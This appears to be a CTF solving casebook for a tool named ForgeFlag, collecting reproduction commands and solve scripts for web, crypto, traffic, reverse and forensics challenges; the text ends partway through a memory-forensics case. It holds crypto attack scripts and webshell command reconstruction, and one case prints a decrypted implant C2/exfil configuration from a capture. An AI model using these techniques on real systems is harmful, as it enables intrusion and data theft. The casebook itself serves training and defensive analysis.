# ForgeFlag CTF Casebook

This casebook records recent hands-on CTF solving patterns. Keep entries short, reproducible, and focused on signals that future solvers can recognize.

## How To Use This Casebook

- Treat every case as a pattern, not as a one-off answer.
- Preserve the shortest discovery path: input artifact, decisive clue, exact transform or command, final verification.
- When adding solver logic, convert the pattern into a small synthetic fixture instead of vendoring original challenge files.
- In the Web UI write-up, keep only the solving idea and reproduction steps.

## Universal Workflow

1. Capture the statement, category, artifacts, and target scope.
2. Run cheap triage first: `file`, `strings`, metadata, HTML source, route listing, JSON shape, or protocol framing.
3. Find the shortest evidence path before adding heavy tools.
4. Generate one replay command or script that a human can run again.
5. Record why the first failed run failed, especially missing decoders, wrong category routing, or unclear report wording.

## Historical Coverage Snapshot

ForgeFlag has accumulated these stable pattern families across local fixtures, Web API corpus runs, browser-player runs, user-uploaded tasks, and recent hardening commits:

| Category | Historical Patterns To Keep |
| --- | --- |
| Web | visible flags, hidden same-origin routes, static JS leaks, response headers/cookies, source-derived framework routes, API option leaks, JWT/session hints, SSRF hints, path traversal hints, LFI-to-artifact chains, status-feed object filtering |
| Crypto | reversible encodings, Caesar/ROT/Morse/ASCII forms, XOR and supplied-key classical ciphers, unknown-key substitution/Vigenere hybrids, AES-CTR nonce reuse, AES-GCM nonce reuse, Poly1305 key reuse, RSA known factors, low exponent, prime modulus, Fermat close primes, common modulus, shared prime, broadcast e=3, modular matrix conjugation |
| Forensics | raw strings, archives and comments, mail/PowerShell base64, PNG text chunks, PNG trailing data, IHDR height mismatch repair, independent/extra IDAT zlib payloads, JPEG comments/APP markers, encoded image metadata |
| Traffic | HTTP payload flags, DNS split label exfiltration, TCP stream follow-up, HTTP object export, SMTP/FTP/IRC-style streams, AntSword/JSP webshell command/output reconstruction |
| Reverse | static strings, packed/UPX markers, encoded string tables, custom protocol reassembly, esolang word mapping, stripped ELF phrase recovery |
| Pwn | scoped service banner capture, source-level format string, source-level ret2win, CCTF pwn3 format string shell path, menu binary command overwrite through stack/heap logic |
| Misc | binary/octal/decimal ASCII, nested transform chains, archive previews, PNG/JPEG puzzles, magic-extension mismatch, LSB extraction, pickle sandbox triage, hash fingerprinting, Krita/OpenDocument-style ZIP subtypes |

## Web Cases

### Static Client Source Leak

Signal:

- Page copy claims the flag is hidden or protected client-side.
- HTML includes a suspicious script such as `/static/secret.js`.

Reproduction:

```bash
curl -sS https://target/
curl -sS https://target/static/secret.js
```

Solver lesson:

- WebSolver should always parse HTML for `script[src]`, fetch same-origin static JavaScript in scoped mode, and scan comments/literals for flag-like strings.
- The write-up should mention "view page source, follow script path, read comment/string".

### Public Status Page Internal Incident Leak

Signal:

- Status page or incident feed.
- Provided source shows an API filter such as `public=true/false`.
- Internal incidents are near the public feed.

Reproduction:

```bash
curl -sS 'https://target/api/incidents?public=false' | python3 -m json.tool
```

Solver lesson:

- WebSolver should inspect route parameters and try documented boolean variants only inside allowed scope.
- LLM profiler should classify this as IDOR/object filtering or authorization logic, not injection.

### Source-Derived Route And Sink Triage

Signal:

- Source attachment is provided with Flask/FastAPI/Express/Django/Laravel-style route declarations.
- The page itself may not expose hidden endpoints.
- Source includes route handlers with option lists, token/session handling, URL fetches, file path joins, or archive extraction.

Reproduction:

```bash
rg -n "@app\\.|app\\.(get|post)|router\\.|Route\\(|path\\(|send_file|open\\(|requests\\.|jwt|session" source/
```

Solver lesson:

- WebSolver should extract source routes and attach bug-class hints: API option leak, JWT/session, SSRF, and path traversal.
- For multi-stage cases, source-derived Web evidence should be allowed to route into ReverseSolver or ForensicsSolver when an artifact path is discovered.

## Crypto Cases

### Substitution Plus Unknown Vigenere

Signal:

- Source encrypts alphabetic characters only, preserving case and punctuation.
- Each plaintext letter first passes through a single shuffled alphabet, then receives a periodic shift.
- Vigenere key length is small but unknown, such as `15..20`.
- Ciphertext is long natural English with normal word spacing, so frequency analysis is viable.

Shortest path:

```python
from collections import Counter

ct = open("ciphertext.txt").read()
letters = [ord(c.lower()) - 97 for c in ct if c.isalpha()]

for L in range(15, 21):
    ics = []
    for r in range(L):
        bucket = letters[r::L]
        counts = Counter(bucket)
        n = len(bucket)
        ics.append(sum(v * (v - 1) for v in counts.values()) / (n * (n - 1)))
    print(L, sum(ics) / L)
```

The highest average IC identified period `20`. For each position bucket, align its letter-frequency vector to bucket zero by trying all 26 shifts and maximizing dot-product overlap. Subtracting those relative shifts converts the problem into a monoalphabetic substitution. The resulting text begins:

```text
Ji nbuj uj s xiop exsuonmtn.
```

That solves as:

```text
So this is a long plaintext.
```

The substitution map for this sample was:

```text
a->k b->h c->y d->c e->p f->b g->u h->m i->o j->s k->r l->q m->e
n->t o->n p->g q->f r->v s->a t->x u->i v->d w->w x->l y->z z->j
```

Decoded flag:

```text
SVIUSCG{those_who_dont_learn_history_alskdfjghmenwncirut}
```

Solver lesson:

- For `substitution -> Vigenere` hybrids, do not brute-force the shuffled alphabet and key together. Estimate the period with IC, align periodic frequency buckets, then solve one monoalphabetic substitution.
- Preserve alphabetic-position counting exactly; punctuation and braces do not advance the Vigenere index in this scheme.
- A readable flag prefix does not guarantee the whole flag content is English. Treat random-looking suffixes as valid if the full surrounding plaintext decrypts consistently.

### AES-CTR Keystream Reuse

Signal:

- Service prints `Encrypted flag`.
- Service encrypts user-controlled plaintext with the same key and nonce.
- Source uses `AES.MODE_CTR` with process-global `KEY` and `NONCE`.

Reproduction:

```python
enc_flag = bytes.fromhex("...")
zero_ct = bytes.fromhex("...")  # encryption of 00 * len(enc_flag)
print(bytes(a ^ b for a, b in zip(enc_flag, zero_ct)).decode())
```

Solver lesson:

- CryptoSolver should flag fixed nonce CTR as a keystream reuse issue and generate a script that sends zero plaintext.
- If remote networking is unstable, ask the user for `Encrypted flag` and the ciphertext of all-zero plaintext; the rest is offline XOR.

### AES-GCM Nonce Reuse

Signal:

- Multiple AES-GCM records share the same nonce under the same key.
- Challenge provides AAD/ciphertext/tag tuples, or source shows nonce reuse.

Reproduction strategy:

- Collect nonce, AAD, ciphertext, and tag for every message.
- Model GHASH equations over `GF(2^128)` to recover or constrain the authentication subkey.
- Use a generated Sage/Python scaffold to verify candidate tags before claiming a plaintext.

Solver lesson:

- CryptoSolver should not pretend to decrypt immediately; it should classify the forbidden-attack workflow and emit a scaffold with all collected fields.
- The write-up should say what evidence is missing if a full forgery/decryption is not possible yet.

### Poly1305 One-Time Key Reuse

Signal:

- Two or more Poly1305 message/tag pairs use the same one-time key.
- Source or protocol shows repeated key/nonce material.

Reproduction strategy:

- Parse messages and tags.
- Build polynomial equations modulo `2^130 - 5`.
- Enumerate carries and solve for reusable key material with Sage or exact integer arithmetic.

Solver lesson:

- CryptoSolver should emit a Sage-oriented helper and record message/tag evidence.
- This is an algebra route, not a wordlist/cracking route.

### RSA Weak Parameter Families

Signals and first moves:

- Known `p`/`q`: compute `phi`, `d`, decrypt.
- Low exponent without padding: test exact integer roots.
- Prime modulus: use `phi = n - 1`.
- Close primes: Fermat factorization.
- Common modulus: combine ciphertexts with extended gcd on exponents.
- Shared prime: `gcd(n1, n2)`.
- Broadcast e=3: CRT then exact cube root.
- Related messages with small `e`: run Franklin-Reiter polynomial GCD when ciphertexts encrypt affine-related plaintexts such as `m` and `m + 1`.
- Leaked high bits of `p`: set `p = p_high + x`, bound `x` by the number of unknown low bits, and use Coppersmith small roots modulo the unknown factor.

Solver lesson:

- CryptoSolver should normalize numbered fields such as `n1/e1/c1`, `n2/e2/c2`, and unnumbered `n/e/c`.
- Every recovered RSA case should produce a replayable solve script, not only a finding.

### RSA Prime High-Bits Coppersmith

Signal:

- RSA modulus is normal-sized, such as 2048 bits with 1024-bit primes.
- The challenge leaks the upper portion of one prime and says the lower bits were zeroed.
- The unknown suffix is smaller than the Coppersmith bound, typically below `N^1/4` for a balanced RSA factor.
- Padding may be randomized, so the route is factor recovery, not direct plaintext structure.

Reproduction:

```sage
PR.<x> = PolynomialRing(Zmod(n))
f = x + p_high
roots = f.small_roots(X=2^unknown_bits, beta=0.5, epsilon=0.02)
for r in roots:
    p = gcd(p_high + Integer(r), n)
    if 1 < p < n and n % p == 0:
        q = n // p
        d = inverse_mod(e, (p - 1) * (q - 1))
        m = power_mod(c, d, n)
```

If Sage's automatic `small_roots` parameters fail near the boundary, construct the lattice manually from `N^(m-i) f(x)^i` and `x^j f(x)^m`, substitute `x * X`, LLL-reduce it, and recover integer roots from the short vector polynomials.

Solved sample:

```text
SVIUSCG{c0pp3rsm1th_wh1sp3rs_4cr0ss_th3_l4tt1c3}
```

Solver lesson:

- Check whether the leak is already shifted into position by counting trailing zero bits on `p_high`.
- Use `beta=0.5` for roots modulo a balanced RSA prime factor, not `beta=1`.
- After factoring, strip PKCS#1 v1.5 padding by finding the zero separator after the random nonzero padding.

### RSA Franklin-Reiter Related Message

Signal:

- Same RSA modulus and small public exponent, commonly `e = 3`.
- Two ciphertexts encrypt related plaintexts such as `m` and `m + 1`, `m + a`, or another known affine transform.
- The challenge may include distracting partial-key material, but the related-message path does not need factoring.

Reproduction:

```sage
R.<x> = PolynomialRing(Zmod(N))
f = x^e - c1
g = (x + 1)^e - c2
h = gcd(f, g).monic()
m = Integer(-h[0]) % N
print(int(m).to_bytes((m.nbits() + 7) // 8, "big"))
```

If Sage's polynomial `gcd` fails over the composite ring because a leading coefficient is not invertible, take `gcd(coefficient, N)`; that failure can itself reveal a factor.

Solved sample:

```text
SVIUSCG{c0pp3r5m1th_fr4nkl1n_r3173r_ch41n3d}
```

Solver lesson:

- Test related-message attacks before spending time on partial private-key recovery when two ciphertexts share a modulus.
- For affine relation `m2 = a*m + b`, use `gcd(x^e - c1, (a*x + b)^e - c2)`.
- The recovered monic linear factor is `x - m`; decode `m` directly as bytes.

### Tiny-Key Custom 24-Bit Block Cipher

Signal:

- Source defines a homemade byte/bit permutation over small fixed-size chunks.
- The key is small enough to search, such as `secrets.token_bytes(4)`.
- The flag prefix gives multiple complete known plaintext blocks.
- The round includes data-dependent rotates or shifts, so direct algebra is more annoying than exact simulation.

Reproduction:

```python
def enc3(block, key, index):
    a, b, c = block
    kint = int.from_bytes(key, "big")
    for _ in range(8):
        hk = (kint >> ((index % 8) * 8)) & 0xff
        th = (a << 16) | (b << 8) | (c ^ hk)
        r = th & 7
        rh = ((th >> r) | (th << (24 - r))) & 0xffffff
        a, b, c = (rh >> 16) & 0xff, (rh >> 8) & 0xff, rh & 0xff
        kint = ((kint >> 3) | (kint << 61)) & ((1 << 64) - 1)
    return bytes([a, b, c])
```

Use the known prefix blocks, such as `SVI` and `USC`, to brute-force the 32-bit key in optimized code. Then invert each round by trying all rotate counts:

```python
def inv_round(y, hk):
    out = []
    for r in range(8):
        th = ((y << r) | (y >> (24 - r))) & 0xffffff
        if (th & 7) == r:
            out.append(bytes([(th >> 16) & 0xff, (th >> 8) & 0xff, (th & 0xff) ^ hk]))
    return out
```

Solved sample:

```text
SVIUSCG{m4dryg4_1s_s3cur3_r1ght}
```

Solver lesson:

- Known plaintext can make a tiny-key custom cipher cheaper to brute-force than to symbolically solve.
- Data-dependent rotations may be many-to-one when inverted; keep candidate sets instead of assuming uniqueness.
- Always re-encrypt the chosen plaintext with the recovered key to confirm the flag.

### Bounded Grammar MD5 Hash Crack

Signal:

- Challenge defines a custom hash wrapper such as `$oak$<version>$<hex digest>`.
- The password format is fully specified, for example `SVIUSCG{<nature>_<gen1_pokemon>}`.
- The candidate space is tiny enough to enumerate directly.

Reproduction:

```python
import hashlib

target = "753a7277c956277fc6a3bb8e31822b25"
natures = ["hardy", "lonely", "brave", "adamant", "..."]
pokemon = ["bulbasaur", "ivysaur", "venusaur", "..."]

for nature in natures:
    for mon in pokemon:
        candidate = f"SVIUSCG{{{nature}_{mon}}}"
        if hashlib.md5(candidate.encode()).hexdigest() == target:
            print(candidate)
```

Solver lesson:

- CryptoSolver should treat custom wrappers as formatting around the digest unless the statement defines extra hashing steps.
- Domain wordlists should include normalization variants for punctuation-heavy names such as `Farfetch'd`, `Mr. Mime`, and Nidoran gender markers.

### Expensive Custom Hash With Structured Domain Grammar

Signal:

- A custom hash format is provided, such as `$oak$<version>$<salt>$<hex digest>`.
- The exact hashing scheme is in source, but each verification is deliberately expensive.
- The password grammar is strongly bounded by domain data, for example:

```text
SVIUSCG{<nature>_<gen1_pokemon>_<move>_<crc32hex>}
crc32hex = crc32("<nature>_<gen1_pokemon>_<move>")
```

Reproduction strategy:

1. Parse the custom hash to extract version, salt, and digest.
2. Generate candidates from authoritative domain lists instead of brute-forcing text:
   - 25 Pokemon natures.
   - Gen 1 Pokemon names.
   - Moves learnable by each Pokemon, preferably `red-blue` / `yellow` for strict Gen 1 learnsets.
3. Compute the CRC32 suffix over the inner string before wrapping it as the flag candidate.
4. Reimplement the verifier in a compiled language or optimized native path, then run candidates in parallel.

Candidate generation:

```python
import json
import zlib

natures = "hardy lonely brave adamant naughty bold docile relaxed impish lax timid hasty serious jolly naive modest mild quiet bashful rash calm gentle sassy careful quirky".split()
learnsets = json.load(open("oakhash_strict.json"))  # [(pokemon, [moves...])]

with open("candidates.txt", "w") as out:
    for nature in natures:
        for pokemon, moves in learnsets:
            for move in moves:
                inner = f"{nature}_{pokemon}_{move}"
                crc = f"{zlib.crc32(inner.encode()) & 0xffffffff:08x}"
                out.write(f"SVIUSCG{{{inner}_{crc}}}\n")
```

Solved sample:

```text
$oak$2$oak-lab-v3$59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f
SVIUSCG{quirky_eevee_tackle_780deef6}
```

Verification:

```bash
python3 oakhash.py 'SVIUSCG{quirky_eevee_tackle_780deef6}' oak-lab-v3
```

Output:

```text
59af26a7a32dd987cb1dd08d4c889c97d8145967a4a4134ae2ea89e703557d1f
```

Solver lesson:

- CryptoSolver should detect expensive custom hashes and avoid pure Python candidate loops when the verifier runs thousands of iterations per candidate.
- Domain-constrained CTF password formats often crack faster by improving candidate correctness than by adding hardware.
- If an external dataset is needed, cache it and record the exact normalization used for names and moves.

### Matrix Conjugation Over Mod n

Signal:

- Encryption is `C = A^-1 M A mod n`.
- Known pairs `(M, C)` are provided.
- Live ciphertext is a list of encrypted matrices.

Reproduction strategy:

- Recover the change-of-basis matrix `A` up to scalar using equations `M A = A C mod n`.
- Stack linear equations from known pairs over `Z/nZ`.
- If Gaussian elimination over `mod n` hits a non-invertible pivot, compute `gcd(pivot, n)`. A non-trivial factor can let the solve continue over a prime field.
- Work modulo the recovered prime factor first. If the plaintext chunks are much smaller than the prime, residues can be read directly as integers without full CRT reconstruction.
- Use the recovered `A` to decrypt live matrices: `M = A C A^-1 mod n`.
- Decode each plaintext matrix entry into bytes according to the provided chunk size.

Solver lesson:

- CryptoSolver should detect conjugation equations and produce a modular linear algebra solve script.
- For composite `n`, bad-pivot GCD is a useful first move before Sage/CRT-aware solving.
- If only one plaintext matrix position carries printable chunks, score entries by printable byte ratio and flag-format prefix before choosing the decode path.

## Traffic Cases

### AntSword/JSP Webshell PCAP Reconstruction

Signal:

- PCAP contains HTTP/JSP webshell traffic.
- Exported objects or streams contain reversed shell commands such as `cut -c N /flag`.
- Output characters may be encoded, for example ROT13.

Reproduction strategy:

```bash
tshark --export-objects http,out -r capture.pcapng
rg -n "cut -c|flag|base64|eval|assert" out
```

Then:

- Reverse the command object when needed.
- Extract `cut -c N /flag` positions.
- Decode single-character command output, such as ROT13.
- Place each recovered character at its requested index.

Solver lesson:

- TrafficSolver should export HTTP objects, identify AntSword-like command/output pairs, recover positional character reads, and write a concise reconstruction report.

### DNS Split Label Exfiltration

Signal:

- Many DNS queries share a base domain.
- Left-most labels look like chunks of base32/base64/hex data.

Reproduction:

```bash
tshark -r capture.pcapng -Y dns -T fields -e dns.qry.name
```

Solver lesson:

- TrafficSolver should group by base domain, preserve packet order, strip fixed suffixes, concatenate labels, and try transform candidates.

### HTTP Object And Stream Follow-Up

Signal:

- HTTP requests/responses carry files or printable payloads.
- Protocol summary points to a small set of streams.

Reproduction:

```bash
tshark -r capture.pcapng -q -z follow,tcp,ascii,STREAM_ID
tshark --export-objects http,out -r capture.pcapng
```

Solver lesson:

- Store stream IDs, exported object paths, hashes, previews, and recovered flag candidates.
- The write-up should include the exact stream ID or object filename.

### Internal Web App Pivot To Business Data

Signal:

- PCAP captures east-west traffic from a workstation to an internal web app.
- Requests use an internal host and nonstandard port, such as `nas-maritime-01.wabashmarine.local:8088`.
- The same service account and Basic Auth header appear across short HTTP sessions.
- Early endpoints reveal identity, index files, and business records rather than a direct exploit payload.

Shortest path:

```bash
tshark -r wabash_nas_pivot_2026-04-18.pcap -q -z conv,tcp
tshark -r wabash_nas_pivot_2026-04-18.pcap -q -z follow,tcp,ascii,0
tshark --export-objects http,out -r wabash_nas_pivot_2026-04-18.pcap
```

Observed chain:

```text
10.42.18.42:FIN-WS-07 -> 10.42.7.18:NAS-MARITIME-01:8088
GET /api/v1/sessions/whoami
GET /api/v1/dispatch/index
GET /api/v1/dispatch/dispatch_2026-04-18.txt
GET /api/v1/personnel/index
GET /api/v1/personnel/crew_manifests_q2_2026.csv
```

The dispatch identified vessel `WAB-2207`. The Q2 crew manifest row for that vessel's `Master` contained a Base64 value in the `notes` field:

```text
U1ZJVVNDR3t3YWJhc2hfZmlud3NfcGl2b3RfbmFzX21hcml0aW1lXzAxfQ==
```

Decoded flag:

```text
SVIUSCG{wabash_finws_pivot_nas_maritime_01}
```

Solver lesson:

- TrafficSolver should reconstruct HTTP object chains and preserve the business clue that caused each next request.
- For CSV/JSON HTTP objects, parse fields and apply transforms to suspicious cells such as `notes`, `comment`, `metadata`, `token`, and `payload`.
- Write-ups for pivot captures should name source, destination, account, endpoint sequence, and the exact field that carried the flag.

### Beacon Host Mismatch And Reused XOR

Signal:

- HTTP capture is mostly normal browsing, but one host has scripted User-Agent traffic, regular polling, and repeated API paths.
- The Host header looks like CDN or telemetry infrastructure, while the destination IP belongs to an unrelated ASN or country.
- Form bodies carry Base64 fields such as `cfg` or `data`; decoded blobs share a long identical prefix.

Reproduction strategy:

```bash
tshark -r capture.pcap -Y http.request \
  -T fields -e frame.number -e ip.src -e ip.dst -e http.host -e http.request.method -e http.request.uri -e http.user_agent
tshark -r capture.pcap \
  -Y 'http.request && http.host == "suspicious.example" && http.file_data' \
  -T fields -e frame.number -e http.request.uri -e http.file_data
```

Then:

- Decode URL-form bodies and Base64 values without converting `+` into spaces.
- Crib common JSON prefixes such as `{"id":"...` against identical ciphertext prefixes. In the SAR-style finance beacon case, this recovered the repeating XOR key `Ar3s_C2!`.
- Decrypt config/result records, then compare declared C2/stage hosts with the actual IP's WHOIS or GeoIP result.
- For Around-the-World style answers, use the real destination country/city rather than the claimed CDN or region string.

Solver lesson:

- TrafficSolver should group HTTP requests by `(host, dst_ip, user_agent)`, score periodic scripted beacons separately from browser traffic, and try known-plaintext repeating-XOR on Base64 form fields with shared prefixes.
- GeoIP/WHOIS evidence should be recorded as a first-class finding when the challenge clue asks where traffic really goes.

Observed case: `portion2.pcap`

The capture was about two hours of outbound web traffic from `10.10.13.37`. Most browser traffic used a Chrome user-agent, but one destination dominated scripted polling:

```text
10.10.13.37 -> 185.93.187.42
Host: telemetry-edge-eu.cdnflare-stat.net
User-Agent: python-requests/2.25.1
Paths: /api/5f3a9c11d4e84b2a/hello, /api/5f3a9c11d4e84b2a/idle, /api/5f3a9c11d4e84b2a/result
```

Shortest path:

```bash
tshark -r portion2.pcap -Y http.request \
  -T fields -E separator=$'\t' \
  -e frame.number -e frame.time_relative -e ip.src -e ip.dst \
  -e http.host -e http.request.method -e http.request.uri -e http.user_agent

tshark -r portion2.pcap \
  -Y 'http.host == "telemetry-edge-eu.cdnflare-stat.net" && http.request.method == "POST"' \
  -T fields -E separator=$'\t' \
  -e frame.number -e tcp.stream -e http.request.uri -e http.file_data
```

Decode the form body manually so Base64 `+` characters are not converted to spaces. The `cfg` and `data` values Base64-decode to ciphertexts with an identical prefix. Cribbing the first blob against `{"id":"5f3a9c11d4e84b2a"` recovers the repeating XOR key:

```text
Ar3s_C2!
```

Decrypting with that key gives the implant configuration:

```json
{
  "id": "5f3a9c11d4e84b2a",
  "campaign": "RAVENGLASS",
  "host": "WIN-DSK-FIN03",
  "user": "j.dvorak",
  "os": "Windows 10.0.19045",
  "c2": "http://ctfchallenge.on-forge.com",
  "port": 80,
  "task_path": "/api/v2/tasks",
  "exfil_path": "/api/v2/upload",
  "interval": 60,
  "jitter": 0.25,
  "stage": "http://http://ctfchallenge.on-forge.com:80/update/manifest.json",
  "note": "key reused for stage manifest"
}
```

The short result posts decrypt to idle/ok records such as:

```json
{"id":"5f3a9c11d4e84b2a","r":"idle"}
{"id":"5f3a9c11d4e84b2a","r":"ok"}
```

There is no embedded `SVI...{...}` string in the capture or exported HTTP objects. The answer evidence is the mismatch itself: the implant claims `ctfchallenge.on-forge.com`, while the observed traffic is to `185.93.187.42` with Host `telemetry-edge-eu.cdnflare-stat.net`. WHOIS/GeoIP identify the real destination as `AS44863 STARNET TC LLC`, `UA`, Kharkiv/Berestyn area.

Likely submit values for CTF platforms that wrap derived answers in a flag:

```text
SVIUSCG{kharkiv_ukraine}
SVIUSCG{berestyn_ukraine}
SVIUSCG{ravenglass_kharkiv_ukraine}
```

Solver lesson:

- When a traffic challenge asks where the host is "really" talking, prioritize the actual destination IP and ASN/GeoIP over the HTTP Host, DNS name, or decrypted configuration's declared C2.
- Do not stop at identifying the noisy domain; decrypt the beacon config to recover campaign, infected host, user, declared C2, and staging path.
- Record whether the flag was directly embedded or inferred from the IOC question so the UI can display confidence and candidate submissions separately.

## Reverse Cases

### Custom TCP Payload Reassembly Into Source

Signal:

- Generator source says packets are `[magic][seq][len][payload]`.
- Valid packets have magic `ZN` and payload beginning with the sequence ID.
- Source was split by stride: `chunks = [code[i::num_strides] for i in range(num_strides)]`.

Reproduction:

```python
raw = bytes.fromhex(open("output.txt").read().strip())
packets = []
i = 0
while i < len(raw):
    magic, seq, ln = raw[i:i+2], raw[i+2], raw[i+3]
    payload = raw[i+4:i+4+ln]
    if magic == b"ZN" and payload.startswith(str(seq).encode()):
        packets.append((seq, payload[1:].decode()))
    i += 4 + ln

chunks = dict(packets)
code = "".join(chunks[i][j] for j in range(max(map(len, chunks.values()))) for i in range(5) if j < len(chunks[i]))
print(code)
```

Solver lesson:

- ReverseSolver should parse explicit protocol annotations from source and output files before trying decompilation.
- If recovered source contains byte arrays plus XOR keys, emit a direct decode script.

### Word Mapping Esolang

Signal:

- Source maps ASCII codes to slang words, for example `sigma rule 83: yapping("hawk")`.
- Output is a word list.

Reproduction:

```python
import re
rules = open("message.txt").read()
word_to_code = {word: int(code) for code, word in re.findall(r'sigma rule\s+(\d+):\s+yapping\("([^"]*)"\)', rules)}
words = open("output.txt").read().split()
print("".join(chr(word_to_code[word]) for word in words))
```

Solver lesson:

- ReverseSolver should recognize dispatch tables and switch cases that print strings for character codes.
- Treat odd "programming languages" as encoders first; build a reverse dictionary.

### Stripped ELF Phrase Recovery

Signal:

- Stripped Linux ELF asks for an override phrase.
- Strings show prompts and a few suspicious encoded byte strings.

Reproduction strategy:

- Run `strings` to identify success/failure prompts.
- Disassemble around `strlen`, compare loops, or encoded constants.
- Look for XOR/add/sub tables in `.rodata`.
- Reconstruct the expected phrase with a Python script rather than brute forcing. For a check like `((input[i] ^ 0x13) + i) & 0xff == table[i]`, invert each byte as `input[i] = ((table[i] - i) & 0xff) ^ 0x13`.
- Verify statically by reapplying the recovered formula to the candidate phrase; dynamic execution is optional when the host architecture or container image is unavailable.

Solver lesson:

- ReverseSolver should pair prompt strings with nearby validation logic in disassembly.
- ReverseSolver should emit the inverse byte formula, `.rodata` table bytes, and recovered phrase in the write-up.
- IDA/Ghidra MCP should be the next tool when symbols are stripped and the compare loop is not clear from linear disassembly.

### Self-Decrypting Bytecode VM With S-Box Constraints

Signal:

- ELF is stripped, statically linked, and has very small `.text`.
- `.rodata` begins with a jump table and contains a 256-byte substitution table plus short `yes`/`no` strings.
- `.data` looks like bytecode rather than normal initialized data.
- VM dispatch reads opcodes from `.data`, stores input in `.bss`, and includes an opcode that XOR-decrypts following bytecode with a state byte derived from prior input.

Reproduction strategy:

- Reconstruct the VM opcode semantics from the jump table handlers.
- Emulate the bytecode, but treat self-decrypting opcodes as phase boundaries.
- Solve early state-updating checks concretely when each block pins one input byte and rolls the VM state through the S-box.
- After decrypting later phases, translate check-only blocks into constraints. For 4-byte S-box relations, a small CSP over the flag charset can be faster than generic SMT.
- Verify the recovered input with a VM emulator when the host cannot execute the Linux ELF directly.

Solved sample:

```text
SVIUSCG{by3_buddy_h0p3_yu0_f1nd_y0ur_d4d}
```

Solver lesson:

- Do not linear-disassemble encrypted VM bytecode; the correct opcode stream may depend on runtime state.
- Structural decoding keys that reach an early success can be decoys if they do not match the VM state computed from input.
- Keep the final solve script self-contained: parse sections, emulate enough VM to recover/decrypt phases, solve constraints, and verify by re-running the VM semantics.

### Packed Or UPX-Marked Binary

Signal:

- `strings` or section names mention `UPX`.
- Normal strings/decompilation are sparse or misleading.

Reproduction strategy:

```bash
file binary
strings -a binary | rg -i "upx|packed"
upx -d binary -o unpacked  # only on a copy
```

Solver lesson:

- ReverseSolver should detect packer indicators and record the next safe step before treating missing strings as a dead end.

## Forensics And Misc Cases

### Truncated ZIP With Missing EOCD

Signal:

- `file` identifies a ZIP archive, but `zipinfo` or `unzip -l` reports "End-of-central-directory signature not found".
- Hex view still shows local file headers such as `PK\x03\x04`, filenames, compressed sizes, uncompressed sizes, and CRC fields.

Reproduction:

```python
import binascii
import struct
import zlib

data = open("archive.zip", "rb").read()
offset = 0
while True:
    start = data.find(b"PK\x03\x04", offset)
    if start < 0:
        break
    _, _, _, method, _, _, crc, csize, usize, nlen, xlen = struct.unpack_from("<IHHHHHIIIHH", data, start)
    name = data[start + 30 : start + 30 + nlen].decode()
    body_start = start + 30 + nlen + xlen
    body = data[body_start : body_start + csize]
    plain = zlib.decompress(body, -15) if method == 8 else body
    assert len(plain) == usize
    assert (binascii.crc32(plain) & 0xFFFFFFFF) == crc
    print(name, plain)
    offset = body_start + csize
```

Solver lesson:

- ForensicsSolver should recover local ZIP entries even when the central directory or EOCD is missing.
- The report should preserve the recovered filenames, CRC check result, and any decoded tag or flag from recovered text.

### Chrome Profile History Leak URL

Signal:

- Windows user profile extract contains Chrome `User Data/Default/History`, `Bookmarks`, `Cookies`, `Login Data`, and PowerShell PSReadLine.
- The statement gives a suspected leak date and user, but the profile has no obvious desktop/downloaded payload.
- Chrome History contains a late or suspicious external URL, often with query parameters such as `tag`, `payload`, `data`, `token`, or `src`.
- The suspicious parameter is Base64 or another transform-friendly encoding.

Shortest path:

```bash
unzip OSPREY-WS-042_plandau_extract.zip -d extract
sqlite3 -header -column \
  extract/Users/plandau/AppData/Local/Google/Chrome/'User Data'/Default/History \
  "select datetime((last_visit_time/1000000)-11644473600,'unixepoch') as t,
          visit_count, typed_count, url, title
   from urls order by last_visit_time;"
```

In the Osprey profile case, the suspicious URL was an external paste mirror upload:

```text
https://paste-mirror-q4.example.invalid/upload?tag=U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9&src=oc
```

Decode the `tag` parameter:

```bash
printf '%s' 'U1ZJVVNDR3tvc3ByZXlfY2hyb21lX2hpc3RvcnlfbGVha191cmx9' | base64 -d
```

Flag:

```text
SVIUSCG{osprey_chrome_history_leak_url}
```

Solver lesson:

- ForensicsSolver should parse Chrome History timestamps with the WebKit epoch conversion.
- Browser profile triage should scan URL query parameters and form-like fields with transform candidates, not only page titles.
- The write-up should preserve the suspicious timestamp, URL host/path, query parameter name, and exact decoder.

### Full-Size JPEG Thumbnail Reveal

Signal:

- `exiftool` shows `Thumbnail Image` data even when GPS/comment metadata is empty.
- The thumbnail has the same dimensions as the main JPEG, or looks suspiciously large for a normal camera thumbnail.
- The visible main image has a natural obstruction, blur, crack, or overlay that may hide text.

Reproduction:

```bash
exiftool -b -ThumbnailImage challenge.jpg > thumb.jpg
file thumb.jpg
```

If the thumbnail does not immediately reveal the text, compare it with the main image:

```python
from PIL import Image, ImageChops, ImageOps

main = Image.open("challenge.jpg").convert("RGB")
thumb = Image.open("thumb.jpg").convert("RGB")
diff = ImageOps.autocontrast(ImageChops.difference(main, thumb))
diff.save("thumbnail_diff.png")
```

Solver lesson:

- ForensicsSolver should extract embedded JPEG thumbnails and scan/render them as separate images.
- When main and thumbnail dimensions match, generate a difference preview because the thumbnail may contain an earlier or edited image layer with the flag still visible.

### Linux Injector Anonymous VMA Cache

Signal:

- A Linux memory snapshot and matching Volatility3 ISF/symbol file are provided.
- The suspicious process has a dull command line, no useful environment variables, and no meaningful open files or sockets.
- `linux.proc.Maps` shows an anonymous `rwx` mapping or other small anonymous region in that process.

Reproduction:

```bash
zstd -d stonehaven_hp_dump.raw.zst -o dump.raw
mkdir -p symbols/linux
gzip -cd linux-debian-6.1.0-42.json.gz > symbols/linux/linux-debian-6.1.0-42.json

vol -f dump.raw -s symbols linux.pslist.PsList
vol -q -f dump.raw -s symbols linux.psaux.PsAux | rg mal_inject
vol -q -f dump.raw -s symbols linux.envars.Envars --pid 82
vol -q -f dump.raw -s symbols linux.lsof.Lsof --pid 82
vol -q -f dump.raw -s symbols linux.proc.Maps --pid 82
vol -q -f dump.raw -s symbols -o dumps linux.proc.Maps --pid 82 --dump --address 0x7f1bbcb8c000
strings -a -n 4 dumps/pid.82.vma.0x7f1bbcb8c000-0x7f1bbcb8d000.dmp
```

In the solved sample, the `rwx` anonymous page contained a Base64 flag:

```text
U1ZJVVNDR3tzdG9uZWhhdmVuX2dsYXNzX2hlcm9uX3N0Z185ZjFhMzN9
